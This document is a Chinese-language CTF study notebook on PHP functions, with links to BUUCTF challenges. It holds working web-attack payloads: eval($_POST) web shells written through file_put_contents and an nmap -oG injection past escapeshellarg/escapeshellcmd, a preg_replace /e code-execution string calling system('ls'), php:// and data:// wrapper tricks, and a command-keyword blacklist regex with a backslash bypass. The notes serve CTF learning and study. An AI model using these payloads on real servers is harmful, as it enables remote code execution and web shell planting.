## php的一些函数

[TOC]



##### ·····in_array():

搜索数组中是否存在指定的值

例：in_array(search,array)

在array中搜索是否有search

##### ·····mb_subster()

:返回字符串的一部分。

![1695391508568](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1695391508568.png)

![1695391533024](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1695391533024.png)

##### mb_strpos()

：返回要查找的字符串在别的一个字符串中首次出现的位置。

### file_put_contents

例：_=file_put_contents('1.php','<?php eval(\$_POST['aa']);?>');

$前面要加一个\才可以

##### file_get_contents($text,‘r’)===“xxxx”

```
POST /?text=php://input
xxxx
```

```
?text=data://text/plain;base64,xxxx的base64加密
```

###### load_file()

ssrf中可能用。

mysql中的load_file函数，允许访问系统内任意文件并将内容以字符串形式返回，不过需要高权限，且函数参数要求文件的绝对路径，绝对路径猜测是/var/www/html/flag.php

###### escapeshellarg()

在字符串中插入‘%81’

###### preg_replace

preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );

这里面$re,$str是我们能控制的，

e模式下的preg_replace可以让第二个参数'替换字符串'当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower("\1")正好表达的就是匹配区的第一个，从而我们如果匹配可以，则可以将函数实现。

  \S*=${getFlag()}&cmd=system('ls');注意代码里面的id和session是骗人的，在正则里面是$_GET，因此不用id传参数；

传入后正则会变为preg_replace('/('.\S*.')/ei','strtolower("\\1")',getFlag());存储临时缓存区:\S*==>getFlag();strtolower("\\1")匹配第一个，从而执行了getFlag()函数

\S是任意匹配到一个就可以。

题目：

[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF，不过如此)

#### escapeshellarg() 函数

[[BUUCTF 2018\]Online Tool | 信安小蚂蚁 (gitee.io)](https://mayi077.gitee.io/2020/07/30/BUUCTF-2018-Online-Tool/)

escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数

功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)

```
<?php
$a = '123';
$b=escapeshellarg($a);
echo "old: ".$a."\n";
echo "now: ".$b;
?>
//old: 123  now: '123' 发现它给2边加了单引号。
<?php
$a = "12'3";
$b=escapeshellarg($a);
echo "old: ".$a."\t\t";
echo "now: ".$b;
?>
//old: 12'3	 now: '12'\''3' 发现单引号被注释，并已它为中介分为2边
<?php
$a = '12"3';
$b=escapeshellarg($a);
echo "old: ".$a."\t\t";
echo "now: ".$b;
?>
//old: 12"3	 now: '12"3'  双引号并不会被反义
<?php
$a = '12\}[*3';
$b=escapeshellarg($a);
echo "old: ".$a."\t\t";
echo "now: ".$b;
?>
//old: 12\}[*3	now: '12\}[*3'  似乎它只在意单引号
```

#### escapeshellcmd() 函数

 **escapeshellcmd()** 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行**转义**。

 反斜杠会在以下字符之前插入： #&;`|*?~<>^()[]{}$, x0A 和 xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 都会被空格代替。（译注：实际测试发现在 Windows 平台是前缀 ^ 来转义的。）*

```
<?php
$a = '12"3';
$b=escapeshellcmd($a);
echo "old: ".$a."\t\t";
echo "now: ".$b;
?>
//old: 12"3	 now: 12\"3  就是把可以字符注释掉
<?php
$a = '12"3"';
$b=escapeshellcmd($a);
echo "old: ".$a."\t\t";
echo "now: ".$b;
?>
//old: 12"3"  now: 12"3" 注意 ' 和 " 仅在不配对儿的时候被转义
<?php
$a ="'123'";
$b=escapeshellcmd($a);
echo "old: ".$a."\t\t";
echo "now: ".$b;
?>
//old: '123'  now: '123' 验证了上面所说的结论。
```

payload

```
' <?= @eval($_POST["mayi"]);?> -oG mayi.php '
```

```
正确的样式：
' <?php @eval($_POST["mayi"]);?> -oG mayi.php '

$host = escapeshellarg($host);
>>> ''\'' <?php @eval($_POST["mayi"]);?> -oG mayi.php' \'''

$host = escapeshellcmd($host);
>>> ''\'' \<\?php @eval($_POST["mayi"])\;\?\> -oG mayi.php' \\'''

# 等价于  \<\?php @eval($_POST["mayi"])\;\?\> -oG mayi.php \\

# 根据解析规则
# 等价于  \<\?php @eval($_POST["mayi"])\;\?\> -oG mayi.php
# 写入后  <?php @eval($_POST["mayi"]);?> -oG mayi.php
——————————————————————————————————————————
但是如果你的payload为：
?host=' <?php @eval($_POST["mayi"]);?> -oG mayi.php'
>>> ''\'' \<\?php @eval($_POST["mayi"])\;\?\> -oG mayi.php'\\'''
>>> <?php @eval($_POST["mayi"]);?> -oG mayi.php\\
# 这样是不会被认为是php文件的。
#所以说必须后面要有 ‘ 而且前面要有空格哟。
```

![1707102016279](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1707102016279.png)



##### preg_match

```
 (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd))
```

我们发现禁用了tac nl more less head tail cat od 等一些可以读取文件内容的关键字，注意看后面的|\\|\\\\|，我们都知道在php中正则过滤反斜杠要写四个\字符，因为会经过两次解析，一次php解析器的解析，另一次是正则表达式的解析。\\\\，先经过php的解析成\\，再经过正则表达式的解析成\，但是前面又多了一个\\，经过php的解析成\，|这个字符在正则中是保留字符，所以可以转义，再经过正则的解析时\会与后面的|一起解析成|，问题就出现在这一块，整个来看，先经过php的解析成|\|\\|，再经过正则的解析成||\|，所以最后匹配的是|\而不是\，所以我们可以用反斜杠绕过
payload：cmd=dir / cmd=ca\t

###### mt_rand()

py有脚本。